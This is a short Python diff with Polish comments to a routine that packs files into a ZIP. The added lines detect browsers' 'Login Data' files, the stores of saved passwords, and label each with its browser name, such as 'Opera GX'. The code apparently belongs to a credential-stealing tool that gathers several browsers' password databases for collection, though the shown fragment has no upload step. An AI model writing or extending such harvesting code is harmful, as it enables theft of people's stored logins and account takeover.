@@ -52,6 +52,10 @@ def create_zip_from_files(file_paths, zip_file_name):
         for file in file_paths:
             if os.path.exists(file):
                 file_name = os.path.basename(file)  # Nazwa pliku bez ścieżki
+                # Dodanie nazwy aplikacji do nazwy pliku, jeśli to Login Data
+                if "Login Data" in file_name:
+                    app_name = file.split("\\")[-3]  # Nazwa aplikacji (np. "Opera GX")
+                    file_name = f"{app_name}_{file_name}"  # Dodajemy aplikację do nazwy pliku
                 zipf.write(file, file_name)
                 print(f"Dodano plik do ZIP-a: {file}")
             else:
